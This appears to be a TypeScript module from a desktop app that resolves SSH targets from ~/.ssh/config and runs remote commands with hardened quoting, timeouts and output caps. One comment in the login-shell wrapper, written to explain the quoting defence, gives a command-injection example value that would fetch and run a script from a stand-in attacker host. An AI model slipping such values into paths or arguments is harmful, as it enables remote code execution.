import { execFile } from 'node:child_process'
import { createHash } from 'node:crypto'
import { chmodSync, existsSync, lstatSync, mkdirSync } from 'node:fs'
import { platform } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'

import type { SshOverrides } from '../../shared/compute'
import { normalizeComputeSshAlias } from '../../shared/compute'
import { buildControlMasterConfig } from './interactive-ssh-broker'

// Maximum bytes captured per stream before we truncate. Caller can pass a smaller cap.
const DEFAULT_MAX_OUTPUT_BYTES = 64 * 1024

// Wraps a string in POSIX single quotes, escaping embedded single quotes via the '\'' idiom. Inside
// single quotes the shell expands nothing, so this is the only safe way to hand an arbitrary command
// string to an outer `bash -lc` layer. (scp-runner exports an identical helper; duplicated here to keep
// ssh-runner free of a dependency on the scp path.)
const shellSingleQuote = (value: string): string => `'${value.replace(/'/g, `'\\''`)}'`

// Short connect timeout used for probe calls; SSH itself honors ConnectTimeout from config but we
// add it explicitly to override any large value from ~/.ssh/config (design.md §1).
const DEFAULT_CONNECT_TIMEOUT_SECS = 10

// The resolved SSH connection target ready for spawning a command.
export type ResolvedSshTarget = {
  // Full path to the ssh binary (e.g. /usr/bin/ssh, C:\Windows\System32\OpenSSH\ssh.exe).
  sshBinary: string
  // The ssh target to pass to ssh/scp. This is the ~/.ssh/config alias (not the resolved IP) so the
  // "Host <alias>" block and all its directives (HostName, IdentityFile, ProxyJump, …) are applied.
  host: string
  // Connection flags resolved from `ssh -G <alias>` plus overrides: -p, -l/-o User, -i, control args.
  extraArgs: string[]
  // Canonical, secret-free identity used to bind an approval to the effective endpoint and config.
  connectionIdentity?: ResolvedSshConnectionIdentity
}

export type ResolvedSshConnectionIdentity = {
  configResolved: boolean
  alias: string
  hostname: string
  user?: string
  port: number
  identityFile?: string
  proxyJump?: string
  hostKeyAlias?: string
  proxyCommandHash?: string
  effectiveConfigHash: string
}

const sha256 = (value: string): string => createHash('sha256').update(value).digest('hex')

const canonicalConfig = (config: Record<string, string>): Array<[string, string]> =>
  Object.entries(config).sort(([left], [right]) => left.localeCompare(right))

export const resolvedSshTargetHash = (target: ResolvedSshTarget): string =>
  sha256(
    JSON.stringify({
      sshBinary: target.sshBinary,
      host: target.host,
      extraArgs: target.extraArgs,
      connectionIdentity: target.connectionIdentity
    })
  )

// The injectable SSH execution interface. The real implementation spawns system ssh; tests substitute
// a fake. All SSH logic stays in the main process — callers in the renderer are never exposed to it.
export interface SshRunner {
  run(
    target: ResolvedSshTarget,
    remoteCommand: string,
    opts: {
      timeoutMs: number
      loginShell?: boolean
      maxOutputBytes?: number
    }
  ): Promise<{
    exitCode: number | null
    stdout: string
    stderr: string
    truncated: boolean
    timedOut: boolean
  }>
}

// Builds the ControlMaster args used on mac/linux to reuse a single SSH connection across the probe
// bundle. Windows does not support ControlMaster so this returns an empty array there.
export const controlMasterArgs = (alias: string, connectionKey?: string): string[] => {
  if (platform() === 'win32') return []
  // Use an app-scoped, hashed per-alias socket with an eight-hour lifetime. ssh does not create the
  // ControlPath parent directory itself, so ensure it exists (mode 0700 like ~/.ssh).
  const config = buildControlMasterConfig(alias, { connectionKey })
  try {
    mkdirSync(config.controlDirectory, { recursive: true, mode: 0o700 })
    const metadata = lstatSync(config.controlDirectory)
    const currentUid = process.getuid?.()
    if (
      !metadata.isDirectory() ||
      metadata.isSymbolicLink() ||
      (currentUid !== undefined && metadata.uid !== currentUid)
    ) {
      return []
    }
    chmodSync(config.controlDirectory, 0o700)
  } catch {
    // Reuse is optional. Fail closed to an ordinary SSH connection if the socket directory cannot
    // be created, verified as user-owned/non-symlink, or restricted to mode 0700.
    return []
  }
  return config.args
}

// Locate ssh.exe on Windows. Tries System32\OpenSSH first (built-in since Win10 1803), then Git for
// Windows. Throws if neither is found so the caller can surface a readable prompt.
const findWindowsSsh = (): string => {
  const candidates = [
    join(process.env['SystemRoot'] ?? 'C:\\Windows', 'System32', 'OpenSSH', 'ssh.exe'),
    'C:\\Program Files\\Git\\usr\\bin\\ssh.exe',
    'C:\\Program Files (x86)\\Git\\usr\\bin\\ssh.exe'
  ]
  for (const candidate of candidates) {
    if (existsSync(candidate)) return candidate
  }
  throw new Error(
    'ssh.exe not found. Install OpenSSH (Settings → Optional features → OpenSSH Client) ' +
      'or Git for Windows, then retry.'
  )
}

// Returns the path to the ssh binary appropriate for the current platform.
export const resolveSshBinary = (): string => {
  if (platform() === 'win32') return findWindowsSsh()
  if (platform() === 'darwin') return '/usr/bin/ssh'
  return 'ssh'
}

// Parses the output of `ssh -G <alias>` (one "key value" line per setting) into a plain object.
// Returns an empty object if parsing fails rather than throwing — the caller will still build a
// usable connection using only the overrides.
const parseSshG = (output: string): Record<string, string> => {
  const result: Record<string, string> = {}
  for (const line of output.split('\n')) {
    const space = line.indexOf(' ')
    if (space === -1) continue
    const key = line.slice(0, space).toLowerCase()
    const value = line.slice(space + 1).trim()
    if (key && value) result[key] = value
  }
  return result
}

// Reads the effective ~/.ssh/config for `alias` by running `ssh -G <alias>`. Returns a lowercased
// key→value map and rejects on process failure so approval-sensitive callers can distinguish a
// resolved bare-host configuration from a failed resolution. Extracted so resolveSshTarget can
// inject a fake in tests without spawning ssh.
const readEffectiveConfig = async (
  alias: string,
  sshBinary: string
): Promise<Record<string, string>> => {
  const execFileAsync = promisify(execFile)
  const { stdout } = await execFileAsync(sshBinary, ['-G', '--', alias], { timeout: 5000 })
  return parseSshG(stdout)
}

// Resolves a ResolvedSshTarget for the given alias + optional overrides. Runs `ssh -G <alias>` to
// read the effective config, then layers the overrides on top. BatchMode=yes and ConnectTimeout are
// always set so the process never hangs on passphrase or slow networks.
//
// The returned `host` is the alias itself — NOT the hostname resolved by ssh -G. This is deliberate:
// passing the alias makes ssh/scp match the user's ~/.ssh/config "Host" block and apply every
// directive there (HostName, User, Port, IdentityFile, ProxyJump, HostKeyAlias, …) exactly like the
// CLI. Returning the resolved IP instead made ssh skip Host-alias matching, silently dropping a
// non-default IdentityFile and causing "Permission denied (publickey,password)" even though
// `ssh <alias>` on the CLI works. ssh -G is still consulted only to surface explicit overrides
// (user/port) on top of whatever config the alias resolves.
export const resolveSshTarget = async (
  alias: string,
  overrides: SshOverrides | undefined,
  // Test seam: inject the ssh -G config reader so resolveSshTarget is unit-testable without
  // spawning ssh. Production callers omit it and get the real readEffectiveConfig.
  readConfig: (
    alias: string,
    sshBinary: string
  ) => Promise<Record<string, string>> = readEffectiveConfig
): Promise<ResolvedSshTarget> => {
  const normalizedAlias = normalizeComputeSshAlias(alias)
  const sshBinary = resolveSshBinary()

  // Read the effective connection config from ~/.ssh/config for this alias. Wrapped in try/catch so
  // a failing readConfig (e.g. ssh -G process error) never breaks basic connection resolution. The
  // returned identity is marked unresolved, and approval-sensitive job dispatch rejects it.
  let sshGConfig: Record<string, string> = {}
  let configResolved = true
  try {
    sshGConfig = await readConfig(normalizedAlias, sshBinary)
  } catch {
    configResolved = false
    // readConfig failed — proceed with overrides and defaults only.
  }

  const extraArgs: string[] = []

  // User/Port: explicit override, or the value ssh -G resolves for this alias. Passing the alias as
  // `host` below already makes ssh apply these from config, so these flags are technically redundant
  // when no override is set — but harmless (values match) and kept for clarity. IdentityFile, by
  // contrast, is override-only because ssh picks it up from config via the alias.
  const resolvedUser = overrides?.user?.trim() ?? sshGConfig['user']
  if (resolvedUser && resolvedUser !== normalizedAlias) {
    extraArgs.push('-o', `User=${resolvedUser}`)
  }

  // Port: override > ssh -G port.
  if (overrides?.port != null) {
    extraArgs.push('-p', String(overrides.port))
  } else if (sshGConfig['port'] && sshGConfig['port'] !== '22') {
    extraArgs.push('-p', sshGConfig['port'])
  }

  // Identity file: explicit override only. When no override is given, the alias (returned as
  // `host` below) makes ssh/scp read IdentityFile straight from ~/.ssh/config — the same way the
  // CLI does — so non-default key paths (e.g. ~/.ssh/myhost.pem) work without the app touching keys.
  if (overrides?.identityFile?.trim()) {
    extraArgs.push('-i', overrides.identityFile.trim())
  }

  // BatchMode: never hang on passphrase / host-key prompt. Combined with StrictHostKeyChecking
  // (default or explicit from config) this means an unknown host key returns exit 255 immediately.
  extraArgs.push('-o', 'BatchMode=yes')

  // ConnectTimeout: override a potentially large value from config so probes fail fast.
  extraArgs.push('-o', `ConnectTimeout=${DEFAULT_CONNECT_TIMEOUT_SECS}`)

  // ControlMaster on mac/linux for connection reuse across the probe bundle. Bind the socket to the
  // resolved endpoint and routing options so a host edit cannot reuse an eight-hour master created
  // for an earlier user/port/key/proxy configuration.
  const connectionKey = JSON.stringify([
    sshGConfig['hostname'] ?? normalizedAlias,
    resolvedUser ?? '',
    overrides?.port ?? sshGConfig['port'] ?? '22',
    overrides?.identityFile?.trim() ?? sshGConfig['identityfile'] ?? '',
    sshGConfig['proxyjump'] ?? '',
    sshGConfig['proxycommand'] ?? '',
    sshGConfig['hostkeyalias'] ?? ''
  ])
  extraArgs.push(...controlMasterArgs(normalizedAlias, connectionKey))

  // Pass the alias — NOT the resolved hostname — as the connection target (see the function
  // docstring above). The app-scoped ControlPath is derived from this stable alias.
  const host = normalizedAlias
  const normalizedOption = (value: string | undefined): string | undefined =>
    value && value.toLowerCase() !== 'none' ? value : undefined
  const port = Number.parseInt(String(overrides?.port ?? sshGConfig['port'] ?? '22'), 10)
  const proxyCommand = normalizedOption(sshGConfig['proxycommand'])
  const connectionIdentity: ResolvedSshConnectionIdentity = {
    configResolved,
    alias: normalizedAlias,
    hostname: sshGConfig['hostname'] ?? normalizedAlias,
    user: resolvedUser || undefined,
    port: Number.isInteger(port) && port > 0 && port <= 65_535 ? port : 22,
    identityFile: overrides?.identityFile?.trim() || normalizedOption(sshGConfig['identityfile']),
    proxyJump: normalizedOption(sshGConfig['proxyjump']),
    hostKeyAlias: normalizedOption(sshGConfig['hostkeyalias']),
    proxyCommandHash: proxyCommand ? sha256(proxyCommand) : undefined,
    effectiveConfigHash: sha256(
      JSON.stringify({
        sshBinary,
        configResolved,
        config: canonicalConfig(sshGConfig),
        overrides: {
          user: overrides?.user?.trim() || undefined,
          port: overrides?.port,
          identityFile: overrides?.identityFile?.trim() || undefined
        }
      })
    )
  }

  return { sshBinary, host, extraArgs, connectionIdentity }
}

// Accumulates stream chunks up to maxBytes, capping stored content and recording whether any bytes
// were dropped. Truncation is tracked here — at the point bytes are actually discarded — rather than
// re-checked afterwards against the already-capped buffer (whose length can never exceed maxBytes,
// which is why the old length-based check could never fire). See design.md §5 "cap-exceeded → truncated=true".
export class CappedOutput {
  private readonly chunks: Buffer[] = []
  private bytes = 0
  private truncated = false

  constructor(private readonly maxBytes: number) {}

  push(chunk: Buffer): void {
    const remaining = this.maxBytes - this.bytes
    if (chunk.length > remaining) {
      // Chunk overflows the cap: keep only what fits (if anything) and flag the drop.
      if (remaining > 0) {
        this.chunks.push(chunk.subarray(0, remaining))
        this.bytes += remaining
      }
      this.truncated = true
      return
    }
    this.chunks.push(chunk)
    this.bytes += chunk.length
  }

  toString(): string {
    return Buffer.concat(this.chunks).toString('utf8')
  }

  wasTruncated(): boolean {
    return this.truncated
  }
}

// Real SSH runner: spawns the system ssh binary. Credentials stay in the OS ssh-agent — this code
// never handles, stores, or transmits keys or passphrases (design.md §1, §2).
export class SystemSshRunner implements SshRunner {
  async run(
    target: ResolvedSshTarget,
    remoteCommand: string,
    opts: {
      timeoutMs: number
      loginShell?: boolean
      maxOutputBytes?: number
    }
  ): Promise<{
    exitCode: number | null
    stdout: string
    stderr: string
    truncated: boolean
    timedOut: boolean
  }> {
    const maxBytes = opts.maxOutputBytes ?? DEFAULT_MAX_OUTPUT_BYTES
    const { loginShell = false } = opts
    const host = normalizeComputeSshAlias(target.host)

    // When loginShell is requested wrap the command in `bash -lc '...'` so login profiles run and a
    // readable ~/.bashrc is attempted before the user command. A non-interactive bash does not read
    // .bashrc by itself, so source it explicitly. A missing .bashrc is a no-op; a source failure
    // exits the remote shell and is returned through the normal command result path. A .bashrc may
    // deliberately return early for non-interactive shells.
    //
    // The wrapper MUST single-quote, not JSON-quote. A double-quoted layer leaves `$(...)`, backticks
    // and `$VAR` live for the OUTER shell, which silently undoes any inner single-quoting a caller did:
    // a spec-supplied cache path like `/data/$(curl evil.sh|sh)` reaches the witness as
    // `test -d '/data/$(...)'`, and the outer double-quoted layer expands it anyway. Single-quoting the
    // whole command makes the outer layer literal, so inner quoting (quoteRemotePath) is load-bearing.
    const loginCommand = `if [ -r ~/.bashrc ]; then . ~/.bashrc || exit $?; fi; ${remoteCommand}`
    const finalCommand = loginShell ? `bash -lc ${shellSingleQuote(loginCommand)}` : remoteCommand

    const args = [...target.extraArgs, '--', host, finalCommand]

    return new Promise((resolve) => {
      const stdoutBuf = new CappedOutput(maxBytes)
      const stderrBuf = new CappedOutput(maxBytes)
      let timedOut = false

      const child = execFile(target.sshBinary, args, { timeout: 0, encoding: 'buffer' })

      const timer = setTimeout(() => {
        timedOut = true
        child.kill('SIGTERM')
      }, opts.timeoutMs)

      child.stdout?.on('data', (chunk: Buffer) => {
        stdoutBuf.push(chunk)
      })

      child.stderr?.on('data', (chunk: Buffer) => {
        stderrBuf.push(chunk)
      })

      child.on('close', (code) => {
        clearTimeout(timer)
        resolve({
          exitCode: code,
          stdout: stdoutBuf.toString(),
          stderr: stderrBuf.toString(),
          truncated: stdoutBuf.wasTruncated() || stderrBuf.wasTruncated(),
          timedOut
        })
      })

      child.on('error', (err) => {
        clearTimeout(timer)
        resolve({
          exitCode: null,
          stdout: '',
          stderr: err.message,
          truncated: false,
          timedOut
        })
      })
    })
  }
}
